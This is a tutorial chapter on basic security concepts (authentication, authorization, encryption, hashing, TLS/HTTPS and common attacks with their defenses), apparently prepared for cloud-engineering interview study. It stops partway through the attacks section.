# 05 - Basic Security

## Table of Contents
1. [Authentication](#authentication)
2. [Authorization](#authorization)
3. [Authentication vs Authorization](#auth-vs-authz)
4. [Encryption](#encryption)
5. [Data States: At Rest, In Transit, In Use](#data-states)
6. [Hashing](#hashing)
7. [SSL/TLS](#ssl-tls)
8. [HTTPS Deep Dive](#https-deep-dive)
9. [Common Attacks and Defenses](#attacks-and-defenses)
10. [AWS Security Mapping](#aws-security-mapping)
11. [Interview Q&A](#interview-qa)

---

## 1. Authentication

### Definition

**Authentication** is the process of verifying that someone (or something) is who they claim to be.

"Are you really who you say you are?"

Authentication answers the question: **Who are you?**

```
Authentication Flow:

User: "I am Alice"          <- Claim (identity assertion)
System: "Prove it"          <- Challenge
User: "Here is my password" <- Proof (credentials)
System: "Password matches!  <- Verification
         You are Alice"
```

### Authentication Methods

#### 1. Something You Know (Knowledge Factor)

**Passwords:**
```
Most common authentication method.

How it works:
1. User creates password during registration
2. Password is hashed (not stored in plain text)
3. On login: entered password is hashed, compared to stored hash
4. If hashes match: authenticated

Weaknesses:
- Brute force attacks (try many combinations)
- Dictionary attacks (try common words/passwords)
- Phishing (tricked into entering password on fake site)
- Credential stuffing (leaked passwords from other sites reused)
- Shoulder surfing (someone watches you type)

Best practices:
- Minimum 12 characters
- Mix upper, lower, numbers, symbols
- Never reuse passwords
- Use a password manager
```

**PIN codes:**
- 4-6 digit numbers
- Used for ATMs, phone unlock
- Low entropy — only 10,000 combinations for 4-digit PIN

**Security questions:**
- "What was the name of your first pet?"
- Considered weak — answers often guessable or findable on social media

#### 2. Something You Have (Possession Factor)

**One-Time Password (OTP):**
```
TOTP (Time-based OTP):
1. During setup, server and user share a secret key
2. App (Google Authenticator) generates 6-digit code using:
   code = HMAC(secret, current_time_rounded_to_30_seconds)
3. Code changes every 30 seconds
4. Server generates the same code and compares

Why it's secure:
- Even if attacker intercepts your password, they also need the current OTP
- Code is only valid for 30 seconds
- Requires physical access to your phone (possession)

HOTP (Counter-based OTP):
- Code changes each time it's used
- Used for hardware tokens (RSA SecurID)
```

**Hardware tokens:**
```
Physical devices:
- RSA SecurID: Displays 6-digit code that changes every 60 seconds
- YubiKey: USB device, touch to authenticate
- Smart cards: Card with embedded chip (common in government/banking)
```

**SMS OTP:**
```
Process: Login -> "Enter OTP sent to +61 4XX XXX XXX"
Problem: SMS can be intercepted (SIM swapping attacks)
Less secure than TOTP apps, but better than password-only

SIM Swapping:
1. Attacker calls mobile carrier
2. Pretends to be you, requests SIM transfer to their phone
3. Your number now goes to their phone
4. Attacker receives your SMS OTPs
```

#### 3. Something You Are (Biometric Factor)

**Fingerprint:** Scanner captures fingerprint, compares to stored template
**Face recognition:** Phone's camera analyzes facial geometry
**Iris scan:** Used in high-security environments
**Voice recognition:** Voice pattern analysis
**Behavioral biometrics:** Typing rhythm, mouse movement patterns

**Biometric pros:**
- Can't forget it
- Hard to steal (can't "phish" a fingerprint)
- Convenient

**Biometric cons:**
- Can't be changed if compromised (your fingerprint is permanent)
- False positives (unlocking for wrong person)
- Privacy concerns (biometric data stored by provider)

#### 4. API Keys

```
API keys are long random strings used to authenticate applications (not humans).

Example:
AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

Usage in HTTP request:
GET /api/data HTTP/1.1
Host: api.example.com
X-API-Key: sk-a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4

Best practices:
- Never hard-code in source code
- Store in environment variables or secrets manager
- Rotate regularly
- Use separate keys per service/environment
- Restrict permissions (principle of least privilege)

AWS equivalent: IAM Access Keys
Better alternative: IAM Roles (no keys needed — EC2 gets temporary credentials automatically)
```

#### 5. SSH Keys

SSH key-based authentication (covered in Linux chapter). Uses asymmetric cryptography:
- Private key on your machine (never shared)
- Public key on the server (in authorized_keys)
- Server challenges you, you prove you have the private key without revealing it

#### 6. MFA (Multi-Factor Authentication)

MFA requires authentication from 2 or more different factors (something you know + something you have + something you are).

```
MFA Examples:

Password (something you know) + 
  TOTP code from phone (something you have) = 2FA

Password + OTP + Fingerprint = 3FA (uncommon)

Why MFA is powerful:
- Attacker needs to compromise multiple independent factors
- Stealing your password alone isn't enough
- Physical device (phone) required for TOTP
- Even if your password is leaked, account stays secure with MFA

AWS IAM MFA:
- Can require MFA for sensitive API calls
- MFA delete for S3 (require MFA to delete versioned objects)
- Require MFA to assume high-privilege roles
```

#### 7. JWT Tokens (JSON Web Tokens)

JWT is a standard for transmitting authentication information between parties as a JSON object, cryptographically signed.

```
JWT Structure: header.payload.signature
(Three Base64-encoded parts separated by dots)

Example JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjg4OTk5OTk5LCJleHAiOjE2ODkwMDM1OTl9.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Decoded Header:
{
  "alg": "HS256",   <- Signing algorithm
  "typ": "JWT"      <- Token type
}

Decoded Payload (claims):
{
  "sub": "user123",           <- Subject (user ID)
  "name": "Alice",            <- Custom claim
  "role": "admin",            <- Custom claim (for authorization)
  "iat": 1688999999,          <- Issued At (Unix timestamp)
  "exp": 1689003599           <- Expiry (Unix timestamp, 1 hour later)
}

Signature:
HMACSHA256(
  base64url(header) + "." + base64url(payload),
  secretKey
)
(Prevents tampering — if payload is modified, signature won't match)
```

**JWT Authentication Flow:**

```
Login:
1. User sends: POST /login {username, password}
2. Server verifies credentials
3. Server creates JWT with user info and signs it with secret key
4. Server returns JWT to client

Subsequent Requests:
1. Client includes JWT in every request:
   Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
2. Server validates JWT signature (no database lookup needed!)
3. Server extracts user info from payload
4. Process request as that user

Why JWT is good:
- Stateless: Server doesn't need to store session data
- Scales well: Any server can validate the token with the shared secret
- Self-contained: User info is in the token itself

JWT vulnerabilities:
- Must validate expiry (exp claim)
- Secret key must be kept secret
- Don't store sensitive data in payload (it's Base64-encoded, not encrypted!)
- Use HTTPS (tokens can be stolen if transmitted over HTTP)
```

---

## 2. Authorization

### Definition

**Authorization** is the process of determining what an authenticated user is allowed to do.

"What are you allowed to do?"

Authorization answers the question: **What can you do?**

```
After Authentication, Authorization kicks in:

Alice is authenticated (we know it's really Alice)

Request: "Delete all user accounts"

Authorization check:
  Is Alice an admin? No
  Does Alice's role have 'delete users' permission? No
  
Result: 403 Forbidden
"You are authenticated but not authorized to do this"
```

### RBAC — Role-Based Access Control

**RBAC** assigns permissions to roles, then assigns roles to users. Users get permissions through their roles.

```
RBAC Model:

Permissions:           Roles:                  Users:
read_articles          Reader Role             Alice (Reader)
write_articles    -->  + read_articles    -->
publish_articles       
delete_articles        Editor Role             Bob (Editor)
manage_users           + read_articles
                       + write_articles
                       + publish_articles
                       
                       Admin Role              Carol (Admin)
                       + ALL permissions
                       + manage_users

Examples:
- Alice can only read articles (Reader role)
- Bob can read, write, publish (Editor role)
- Carol can do everything including manage users (Admin role)

Benefits:
- Easy to manage at scale (assign role, not individual permissions)
- Easier auditing (what can role X do?)
- Standard pattern — most systems use RBAC

AWS RBAC Implementation:
Users -> IAM Groups -> IAM Policies (permissions)

IAM Policy example:
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::my-bucket/*"
  }]
}
```

### ABAC — Attribute-Based Access Control

**ABAC** grants permissions based on attributes of the user, resource, and environment.

```
ABAC Model:

Access Decision based on:
- User attributes: department=engineering, clearance=secret, role=developer
- Resource attributes: classification=secret, owner=engineering, environment=prod
- Environment attributes: time=business-hours, ip=corporate-network

Example rules:
"Allow IF user.department == resource.department 
         AND user.clearance >= resource.classification
         AND environment.ip IN corporate_network_ranges"

Result:
- Alice (engineering, secret clearance) accessing engineering/secret resource 
  during business hours from office = ALLOW
- Bob (marketing, public clearance) accessing same resource = DENY
- Alice accessing from home (outside corporate network) = DENY

Benefits:
- Very fine-grained control
- Dynamic — decisions based on context
- No need to pre-define every role combination

AWS ABAC:
- IAM tags on resources and users
- Policy conditions using tag values
- "Allow if user:CostCenter tag matches resource:CostCenter tag"
```

### Policies and ACLs

**Policy:** A document defining what actions are allowed or denied.

```
AWS IAM Policy (JSON format):
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowS3ReadAccess",
      "Effect": "Allow",              <- Allow or Deny
      "Action": [                     <- What operations
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [                   <- On which resources
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ],
      "Condition": {                  <- Under what conditions
        "IpAddress": {
          "aws:SourceIp": "10.0.0.0/8"
        }
      }
    }
  ]
}
```

**ACL (Access Control List):** A list of permissions attached to a resource, specifying which users or systems can access it.

```
Traditional Linux ACL (on a file):
User alice: read, write
User bob: read only
Group engineers: read, write
Others: no access

S3 Bucket ACL (older method, prefer bucket policies):
Owner: FULL_CONTROL
Authenticated users: READ
Everyone: No access

Modern preference: Use IAM Policies (not ACLs) for fine-grained control in AWS
```

### Principle of Least Privilege

**Definition:** Give users (and services) the minimum level of access required to perform their job functions — nothing more.

```
Violation of Least Privilege:
Developer needs to read from one S3 bucket.
Admin gives: AdministratorAccess policy
Result: Developer can now delete all EC2 instances, 
        read all S3 buckets, access all databases.
        If developer's credentials are compromised = 
        attacker has full admin access.

Following Least Privilege:
Developer needs to read from one S3 bucket.
Admin gives:
  s3:GetObject on arn:aws:s3:::specific-bucket/*
  s3:ListBucket on arn:aws:s3:::specific-bucket
Result: Developer can only read from that one bucket.
        If credentials compromised = attacker can only
        read from that one bucket.

Blast radius reduction: Least privilege limits damage from compromised credentials.
```

---

## 3. Authentication vs Authorization

This is one of the most commonly asked security interview questions.

### Side-by-Side Comparison

```
Authentication                          Authorization
================================        ================================
WHO ARE YOU?                            WHAT CAN YOU DO?
Proves identity                         Determines permissions
Happens FIRST                           Happens AFTER authentication
"I am Alice"                            "Alice can read but not write"
Uses: passwords, keys, biometrics       Uses: policies, roles, ACLs
HTTP 401 = Unauthenticated              HTTP 403 = Unauthorized
"Log in first"                          "You don't have permission"

Example: You are authenticated as a     Example: You are authenticated as a 
regular employee (we know who you are)  regular employee, but you tried to
                                        access the CEO's private drive.
                                        403 Forbidden.

Real world analogy:
Authentication = Showing your ID        Authorization = Being on the guest list
at the club door.                       at the VIP section.
"Yes, you are who you say you are"      "Yes, but you're not allowed in here"
```

### HTTP Status Codes for Auth

```
401 Unauthorized: Actually means Unauthenticated
  "You haven't logged in, or your token is invalid/expired"
  Despite the name, this is an authentication failure
  
403 Forbidden: Means Unauthorized (authorization failure)
  "You are logged in, but you don't have permission to do this"
  
Example:
GET /api/admin/users HTTP/1.1
Authorization: (missing)
-> 401 Unauthorized (you need to authenticate)

GET /api/admin/users HTTP/1.1
Authorization: Bearer <valid-token-for-regular-user>
-> 403 Forbidden (authenticated, but not authorized - not an admin)
```

---

## 4. Encryption

### What is Encryption?

Encryption is the process of converting readable data (plaintext) into unreadable data (ciphertext) using an algorithm and a key. Only someone with the correct key can decrypt it back to plaintext.

```
Encryption:
Plaintext: "Hello, World!"
         + Algorithm (AES) + Key
Ciphertext: "X#@!$%^8fK3..."  <- Unreadable without key

Decryption:
Ciphertext: "X#@!$%^8fK3..."
          + Algorithm (AES) + Same Key
Plaintext: "Hello, World!"
```

### Symmetric Encryption

**One key** is used for both encryption and decryption. Same key locks and unlocks.

```
Symmetric Encryption:

            Key: "secret123"
                |
Plaintext ---->[ENCRYPT]----> Ciphertext
                                  |
                                  | (transmitted/stored)
                                  |
Plaintext <---[DECRYPT]<---- Ciphertext
                |
            Key: "secret123"  (SAME key)

Analogy: A padlock where the same key locks and unlocks it.
```

**Symmetric Algorithms:**

```
AES (Advanced Encryption Standard):
  - Most widely used symmetric cipher
  - Block cipher: encrypts data in fixed-size blocks (128 bits)
  - Key sizes: AES-128, AES-192, AES-256 (number = key bits)
  - AES-256: 2^256 possible keys = computationally impossible to brute force
  - Used by: HTTPS, disk encryption (BitLocker, LUKS), AWS KMS
  - NIST-approved, used by US government

DES (Data Encryption Standard):
  - Old, 56-bit key = only 2^56 = 72 quadrillion keys
  - Cracked in 1999 using brute force
  - Do not use

3DES (Triple DES):
  - Applies DES three times
  - More secure than DES but slow
  - Being phased out

ChaCha20:
  - Stream cipher (encrypts data bit by bit, not blocks)
  - Used in TLS 1.3, mobile devices
  - Fast on hardware without AES acceleration
```

**Symmetric Encryption Pros and Cons:**

```
Pros:
+ Very fast (AES hardware acceleration in most CPUs)
+ Efficient for large amounts of data
+ Simpler to implement

Cons:
- Key distribution problem:
  How do you securely share the key?
  If you send it unencrypted, anyone intercepting it can decrypt everything.
  If you encrypt the key... how do you share THAT key?
- Key management: N parties communicating = N*(N-1)/2 unique keys needed
  100 parties = 4,950 keys to manage
- No non-repudiation (anyone with the key can encrypt/decrypt)
```

### Asymmetric Encryption

**Two mathematically linked keys:** public key and private key.
- Public key: Can be shared with anyone
- Private key: Kept secret, never shared

Data encrypted with the **public key** can only be decrypted with the **private key**.
Data encrypted with the **private key** can be verified (decrypted/checked) with the **public key**.

```
Asymmetric Encryption:

Key Generation:
Key Pair: {Public Key: pub, Private Key: priv}
Mathematically linked: what one encrypts, only the other decrypts

Encryption for Confidentiality:
           Alice's Public Key (pub_alice)
                    |
Bob's Msg ------>[ENCRYPT]--------> Ciphertext
                                        |
                                    (send to Alice)
                                        |
Alice's Msg <---[DECRYPT]<--------- Ciphertext
                    |
          Alice's Private Key (priv_alice)

Result: Only Alice can read it (she's the only one with her private key)

Digital Signature for Authentication:
         Alice's Private Key (priv_alice)
                    |
Alice's Msg ----->[SIGN]-----------> Signed Message
                                        |
                                    (send to anyone)
                                        |
Verify <------[VERIFY]<------------- Signed Message
                    |
          Alice's Public Key (pub_alice)

Result: Anyone can verify Alice signed it (public key is public)
        Alice can't deny it (only her private key could have signed it)
```

**Asymmetric Algorithms:**

```
RSA (Rivest-Shamir-Adleman):
  - Based on difficulty of factoring large prime numbers
  - Key sizes: 1024, 2048, 4096 bits
  - 2048+ recommended today (1024 is broken)
  - Uses:
    - SSH key pairs (what you use to connect to EC2)
    - TLS/SSL certificates
    - PGP email encryption
    - Code signing

ECC (Elliptic Curve Cryptography):
  - Same security as RSA but with much smaller keys
  - 256-bit ECC ≈ 3072-bit RSA in security
  - Faster, uses less energy
  - Used in modern TLS (ECDHE), Bitcoin, SSH (ed25519)

Diffie-Hellman Key Exchange:
  - Not encryption itself, but a key exchange protocol
  - Two parties establish a shared secret over an insecure channel
  - Neither party transmits the shared secret directly
  - Foundation of TLS key exchange
```

**Asymmetric Pros and Cons:**

```
Pros:
+ Solves key distribution problem (share public key openly)
+ Digital signatures (non-repudiation)
+ N parties only need N key pairs (not N*(N-1)/2)
+ Never need to share private key

Cons:
- MUCH slower than symmetric (1000x+ slower)
- Not practical for bulk data encryption
- Solution: Use asymmetric to exchange a symmetric key (hybrid approach)
```

### Hybrid Encryption (How TLS Actually Works)

```
TLS uses BOTH asymmetric and symmetric:

1. Asymmetric phase (slow, but solves key exchange):
   Client and server use asymmetric crypto to securely exchange
   a symmetric session key.

2. Symmetric phase (fast, bulk data):
   All actual data encrypted with the session key (AES).

Result:
- Security of asymmetric (key exchange is secure)
- Speed of symmetric (data transfer is fast)

This is exactly what HTTPS/TLS does.
```

---

## 5. Data States: At Rest, In Transit, In Use

```
Three states of data, each with different security needs:

1. DATA AT REST:
   Data stored on disk, database, S3 bucket
   
   Threats: Physical theft, unauthorized disk access, 
            compromised storage system
   
   Protection: Encryption at rest
   
   Examples:
   - AWS S3: SSE-S3, SSE-KMS, SSE-C encryption options
   - AWS EBS: Encrypted EBS volumes
   - RDS: Encrypted databases
   - Local disk: Linux LUKS, BitLocker (Windows)
   
   "The data is sleeping. Lock the safe."

2. DATA IN TRANSIT:
   Data moving over a network (between client and server,
   between services, between data centers)
   
   Threats: Man-in-the-middle attack, eavesdropping, 
            packet sniffing on shared networks
   
   Protection: Encryption in transit (TLS/HTTPS, TLS for databases)
   
   Examples:
   - HTTPS for web traffic
   - TLS for database connections
   - VPN tunnels
   - AWS: TLS between services, HTTPS for all API calls
   
   "The data is moving. Put it in an armored truck."

3. DATA IN USE:
   Data being actively processed in CPU/RAM
   
   Threats: Memory scraping, cold boot attacks, 
            malicious hypervisor (in cloud), hardware vulnerabilities
   
   Protection: Hardware security (Trusted Execution Environments)
   
   Examples:
   - Intel SGX (Software Guard Extensions)
   - AMD SEV (Secure Encrypted Virtualization)
   - AWS Nitro Enclaves
   
   "The data is being worked with. Protect the workspace."
```

---

## 6. Hashing

### What is Hashing?

A hash function takes any input and produces a fixed-size output (hash/digest). It's a one-way function — you cannot reverse it to get the original input.

```
Hash Function Properties:

1. Deterministic: Same input always produces same output
   "password123" -> "ef92b778bafe771207..."  (always same)

2. Fixed output size: Regardless of input size
   "a" -> "ca978112ca1bbdcafac..."     (64 chars)
   "10MB file" -> "abc123def456..."     (64 chars, same length)

3. One-way: Cannot reverse the hash to get original input
   "ef92b778..." -> ??? (impossible to recover "password123")

4. Avalanche effect: Small input change = completely different hash
   "password123" -> "ef92b778bafe771207..."
   "Password123" -> "9a900571e4b77b3a60..."  (completely different)

5. Collision resistance: Very hard to find two inputs with same hash
```

### Common Hash Algorithms

```
MD5:
  - Output: 128 bits (32 hex chars)
  - Example: MD5("hello") = "5d41402abc4b2a76b9719d911017c592"
  - BROKEN: Collisions can be found quickly
  - Use for: File integrity checks (not security), NOT passwords

SHA-1:
  - Output: 160 bits (40 hex chars)
  - BROKEN: Collision attack demonstrated by Google (2017)
  - Do not use for security purposes

SHA-256 (part of SHA-2 family):
  - Output: 256 bits (64 hex chars)
  - Example: SHA256("hello") = "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
  - Currently secure and widely used
  - Used in: TLS certificates, Bitcoin, AWS signature verification, JWT

SHA-3:
  - Output: 256, 384, or 512 bits
  - Different design from SHA-2 (Keccak algorithm)
  - NIST standardized 2015
  - Used as alternative to SHA-2

bcrypt:
  - Specifically designed for password hashing
  - Intentionally slow (configurable work factor)
  - Includes salt automatically
  - "Cost factor" — can increase as hardware gets faster
  - Industry standard for password storage

Argon2:
  - Winner of Password Hashing Competition (2015)
  - Memory-hard: requires large memory to compute (defeats GPU attacks)
  - Recommended for new systems
  - Variants: Argon2i, Argon2d, Argon2id
```

### Why Passwords Are Hashed, Not Encrypted

```
If passwords were ENCRYPTED:
- You could decrypt them to compare
- But: if database is stolen AND attacker gets the encryption key,
  all passwords are exposed instantly
- Key management problem

If passwords were STORED IN PLAINTEXT:
- Database breach = all passwords exposed
- Users reuse passwords = multiple accounts compromised
- (Terrible practice, but happens)

Correct approach: HASH passwords
- Store hash(password), not the password
- On login: compare hash(entered_password) with stored hash
- Even if database is stolen: attacker has hashes, not passwords
- To recover original password, attacker must brute force

Database breach comparison:
Plaintext: password = "mypassword" -> Attacker immediately knows password
Encrypted: encrypted(mypassword) -> Attacker decrypts with key = same result
Hashed: hash("mypassword") = "ef92..." -> Attacker must guess and hash to find
```

### Salting

Salting adds a unique random value to each password before hashing to defeat pre-computed attack tables.

```
The Problem Without Salt (Rainbow Tables):

Attacker pre-computes hashes for common passwords:
"password" -> "5e884898da28047..."
"123456"   -> "8d969eef6ecad3c2..."
"qwerty"   -> "b1b3773a05c0ed01..."
...
(Billions of password-hash pairs stored)

Attack: Steal database, compare hashes to table -> instant cracking

Solution: SALT

Each user gets a unique random salt:
Alice: salt = "x7k2m"
      hash("x7k2m" + "password") = "a8f2bc..." (different from unsalted hash)

Bob:   salt = "p9n3q"
      hash("p9n3q" + "password") = "z3c7mn..." (different from Alice's even if same password!)

Database stores: {user: alice, salt: "x7k2m", hash: "a8f2bc..."}

Now rainbow tables don't work:
- Each hash is unique to that user+password combination
- Attacker must generate a new rainbow table per user (infeasible)

bcrypt does this automatically — it includes the salt in the stored hash:
$2b$12$LQv3c6zEAztmzST7J41GKOXlXQlJCVGp/k9AqXWXf7YKJ9uPVh7vS

$2b = bcrypt version
$12 = cost factor (2^12 = 4096 iterations)
LQv3c6zEAztmzST7J41GKO = 22-char encoded salt
xlXQlJCVGp/k9AqXWXf7YKJ9uPVh7vS = 31-char hash
```

---

## 7. SSL/TLS

### What Problem SSL/TLS Solves

Without SSL/TLS:
```
You (Browser)                              amazon.com
       |                                       |
       |  "My username: alice               |
       |   My password: hunter2             |
       |   My card: 4111 1111 1111 1111"    |
       | ---------------------------------->|
       
Anyone on the network path can read this:
- Your ISP
- Coffee shop WiFi operator
- Malicious router
- Government monitoring
```

With SSL/TLS (HTTPS):
```
You (Browser)                              amazon.com
       |                                       |
       |  "Xk2#$fK3...9Xm@qW..."              |
       | ---------------------------------->|
       |  (Encrypted — unreadable)             |
       
Only amazon.com's server can decrypt this.
Network path can only see encrypted ciphertext.
```

### What SSL/TLS Provides

1. **Confidentiality:** Data is encrypted in transit (AES)
2. **Integrity:** Data wasn't tampered with (MAC — Message Authentication Code)
3. **Authentication:** You're talking to the real server (certificates)

### SSL vs TLS

```
SSL (Secure Sockets Layer):
  SSL 1.0: Never released (vulnerabilities found)
  SSL 2.0: Released 1995, broken in 2011, deprecated
  SSL 3.0: Released 1996, POODLE vulnerability 2014, deprecated

TLS (Transport Layer Security) - SSL's successor:
  TLS 1.0: Released 1999, deprecated 2020
  TLS 1.1: Released 2006, deprecated 2020
  TLS 1.2: Released 2008, widely used today, still secure
  TLS 1.3: Released 2018, faster and more secure, recommended

"SSL Certificate" is the common term (even though it's really TLS)
People still say "SSL" but mean TLS 1.2 or 1.3.
```

### TLS Certificates

A TLS certificate is a digital document that:
1. Contains the server's public key
2. States which domain the key belongs to (e.g., amazon.com)
3. Is signed by a Certificate Authority (CA) that the browser trusts

```
Certificate Contents:
- Subject: CN=amazon.com, O=Amazon.com Inc, C=US
- Issuer: CN=DigiCert Global Root CA
- Public Key: (RSA 2048-bit or ECDSA P-256)
- Valid From: 2025-01-01
- Valid To: 2026-01-01
- Subject Alternative Names: amazon.com, *.amazon.com, www.amazon.com
- Signature: [Signature by DigiCert over all of the above]

Certificate Chain:
Your Browser
  trusts --> Root CA (DigiCert, Let's Encrypt, Comodo...)
                |
                | signed
                v
           Intermediate CA
                |
                | signed
                v
          amazon.com certificate
```

### Certificate Authorities (CAs)

```
Certificate Authorities:
  - Trusted third parties that vouch for certificate owners
  - Browser makers (Google, Mozilla, Apple, Microsoft) decide which CAs to trust
  - Your browser comes pre-installed with ~100-150 trusted root CAs

Major CAs:
  DigiCert
  Comodo/Sectigo
  Let's Encrypt (free, automated, widely used)
  GlobalSign
  GoDaddy
  Amazon (ACM - issues certs for AWS services)

Trust Chain:
  Browser trusts DigiCert (pre-installed root)
  DigiCert signed Amazon's cert
  Therefore browser trusts Amazon's cert
  "Chain of trust"
```

### TLS 1.2 Handshake Step by Step

```
TLS 1.2 Handshake:

Client (Browser)                              Server (amazon.com)
      |                                              |
      | 1. CLIENT HELLO                              |
      |    TLS version: 1.2                          |
      |    Cipher suites I support:                  |
      |    [TLS_RSA_WITH_AES_256_GCM_SHA384,         |
      |     TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,   |
      |     ...]                                     |
      |    Client Random: a1b2c3... (32 random bytes)|
      | ------------------------------------------> |
      |                                              |
      | 2. SERVER HELLO                              |
      |    TLS version: 1.2                          |
      |    Cipher suite chosen:                      |
      |    TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384     |
      |    Server Random: d4e5f6... (32 random bytes)|
      | <------------------------------------------ |
      |                                              |
      | 3. SERVER CERTIFICATE                        |
      |    [amazon.com's TLS certificate]            |
      | <------------------------------------------ |
      |                                              |
      | 4. SERVER KEY EXCHANGE                       |
      |    (ECDHE: server's public ECDH parameter)   |
      | <------------------------------------------ |
      |                                              |
      | 5. SERVER HELLO DONE                         |
      | <------------------------------------------ |
      |                                              |
      | 6. Client validates certificate:             |
      |    - Is it signed by a trusted CA?           |
      |    - Is the domain correct? (amazon.com)     |
      |    - Is it expired?                          |
      |    - Is it revoked?                          |
      |                                              |
      | 7. CLIENT KEY EXCHANGE                       |
      |    (Client's ECDH parameter)                 |
      | ------------------------------------------> |
      |                                              |
      |    [Both sides compute pre-master secret     |
      |     from ECDH parameters]                    |
      |    [Both derive session keys from:           |
      |     pre-master + client random + server random]|
      |                                              |
      | 8. CHANGE CIPHER SPEC                        |
      |    "Switching to encrypted communication"    |
      | ------------------------------------------> |
      |                                              |
      | 9. FINISHED (encrypted)                      |
      |    Hash of entire handshake (verify no       |
      |    tampering occurred)                       |
      | ------------------------------------------> |
      |                                              |
      | 10. CHANGE CIPHER SPEC                       |
      | <------------------------------------------ |
      |                                              |
      | 11. FINISHED (encrypted)                     |
      | <------------------------------------------ |
      |                                              |
      | === Handshake Complete. Encrypted session === |
      |                                              |
      | 12. All subsequent data encrypted with AES  |
      |    using the session keys derived in step 7  |
```

### TLS 1.3 Handshake (Faster)

```
TLS 1.3 is simpler and faster:
- Reduces handshake to 1 round trip (vs 2 in TLS 1.2)
- Removes weak cipher suites
- Forward secrecy required (ECDHE always)

TLS 1.3 Handshake:

Client                               Server
  |                                     |
  | 1. CLIENT HELLO                     |
  |    + Key share (ECDHE params)       |
  | ---------------------------------> |
  |                                     |
  | 2. SERVER HELLO                     |
  |    + Certificate                    |
  |    + Key share (ECDHE params)       |
  |    + Finished (encrypted already!)  |
  | <---------------------------------- |
  |                                     |
  | 3. Finished                         |
  | ---------------------------------> |
  |                                     |
  | === Application data flowing ===    |

TLS 1.3 vs 1.2:
- 1 round trip instead of 2 (saves ~100ms)
- 0-RTT for resumed sessions (even faster for returning visitors)
- Removed: RSA key exchange, DH without ECDHE, CBC mode ciphers, SHA-1 MAC
- All new connections: Perfect Forward Secrecy guaranteed
```

---

## 8. HTTPS Deep Dive

### How HTTPS Works End-to-End

```
Complete HTTPS Request Flow:

1. User types: https://amazon.com
   or clicks HTTPS link

2. DNS resolution:
   amazon.com -> 205.251.242.103

3. TCP Connection:
   Browser -> TCP SYN -> 205.251.242.103:443
   [Three-way TCP handshake completes]

4. TLS Handshake:
   [As described above - ~1-2 round trips]
   Result: Shared symmetric session key established

5. HTTP Request (now encrypted):
   GET / HTTP/1.1
   Host: amazon.com
   [Encrypted with AES session key before sending]

6. Server processes request, sends encrypted response:
   HTTP/1.1 200 OK
   Content-Type: text/html
   [Encrypted with AES session key]

7. Browser decrypts response, renders page
```

### Certificate Validation

```
When browser receives a certificate, it checks:

1. CHAIN TRUST: Does it trace back to a trusted root CA?
   amazon.com cert <- signed by DigiCert Intermediate CA
   DigiCert Int. CA <- signed by DigiCert Root CA
   DigiCert Root CA <- pre-installed in browser
   Chain is valid!

2. DOMAIN MATCH: Does CN or SAN match the domain you're visiting?
   Certificate: CN=amazon.com, SAN: *.amazon.com
   You're visiting: www.amazon.com
   *.amazon.com matches www.amazon.com -> Valid!

3. VALIDITY PERIOD: Is current date within valid range?
   Valid From: 2025-01-01
   Valid To:   2026-01-01
   Today: 2026-06-08 -> EXPIRED!
   Browser shows certificate error.

4. REVOCATION: Has the certificate been revoked?
   CRL (Certificate Revocation List): Download list of revoked certs
   OCSP (Online Certificate Status Protocol): Real-time check
   If revoked (e.g., private key was stolen): Browser shows error

Failure = Browser shows security warning:
"Your connection is not private - NET::ERR_CERT_AUTHORITY_INVALID"
```

### Certificate Types

```
Domain Validated (DV):
  - Cheapest, quickest (minutes)
  - Only proves you control the domain
  - Let's Encrypt provides free DV certificates
  - Shows padlock in browser
  - Example: Small blogs, personal sites

Organization Validated (OV):
  - CA verifies organization identity (takes days)
  - Shows organization name in certificate details
  - Example: Business websites

Extended Validation (EV):
  - Strictest vetting of organization identity
  - Used to show company name in browser bar (green bar - mostly deprecated now)
  - Most expensive and time-consuming
  - Example: Banks, e-commerce

Wildcard:
  - *.example.com matches any single subdomain
  - www.example.com, api.example.com, admin.example.com
  - Does NOT match sub.sub.example.com

Multi-Domain (SAN):
  - One certificate for multiple different domains
  - example.com, example.org, otherdomain.com
  
AWS ACM (Certificate Manager):
  - Free TLS certificates for use with AWS services
  - Automatic renewal
  - DV certificates
  - Works with ALB, CloudFront, API Gateway
```

---

## 9. Common Attacks and Defenses

### Man-in-the-Middle (MITM) Attack

```
MITM Attack:

Without protection:
Client <-------> Attacker <-------> Server
(Client thinks it's talking to server)
(Server thinks it's talking to client)
Attacker reads/modifies all traffic

How MITM is performed:
- ARP Poisoning: Attacker on same network poisons ARP cache
  "I am the gateway (10.0.1.1)" -> All traffic flows through attacker
- DNS Spoofing: Attacker returns fake IP for legitimate domain
- Rogue WiFi: "Free Airport WiFi" hotspot controlled by attacker
- BGP Hijacking: Advanced — misdirecting internet traffic at routing level

Defense: HTTPS/TLS
- Server presents certificate
- Certificate is signed by trusted CA
- Attacker can't forge a valid certificate for amazon.com
- Browser verifies certificate -> detects impersonation attempt
- HSTS (HTTP Strict Transport Security): Browser only uses HTTPS for domain
```

### Brute Force Attack

```
Brute Force:
Systematically try every possible password combination.

4-digit PIN: 10,000 combinations (fast)
6-char lowercase: 26^6 = 308 million (minutes with modern hardware)
8-char mixed: 94^8 = 6 quadrillion (weeks with GPU)
12-char mixed: Effectively infeasible

Defenses:
1. Account lockout: Lock after N failed attempts (e.g., 5 attempts)
2. Rate limiting: Limit to N attempts per minute/hour per IP
3. CAPTCHA: Require human verification after failed attempts
4. MFA: Password alone isn't enough even if guessed
5. Strong passwords: Long + complex = more combinations
